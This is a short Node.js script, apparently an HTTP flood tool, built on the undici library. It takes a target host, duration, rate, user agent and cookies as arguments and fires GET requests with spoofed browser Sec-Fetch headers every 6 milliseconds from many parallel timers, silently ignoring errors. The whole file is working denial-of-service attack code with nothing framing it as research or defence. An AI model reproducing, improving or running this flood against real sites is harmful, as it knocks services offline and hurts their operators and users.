const { request } = require('undici');

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const userAgent = process.argv[5];
const cookies = process.argv[6];

async function flood(host, duration, rates, userAgent, cookies) {
  const endTime = Date.now() + duration * 1000;

  async function sendRequest() {
    try {
      const response = await request(host, {
        method: 'GET',
        headers: {
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "none",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          'User-Agent': userAgent,
           Cookie: cookies,
        },
      });
    } catch (error) {
    }
  }

  for (let i = 0; i < rates; i++) {
    const intervalId = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(intervalId);
      } else {
        sendRequest();
      }
    }, 6);
  }

  console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
}

flood(host, duration, rates, userAgent, cookies)
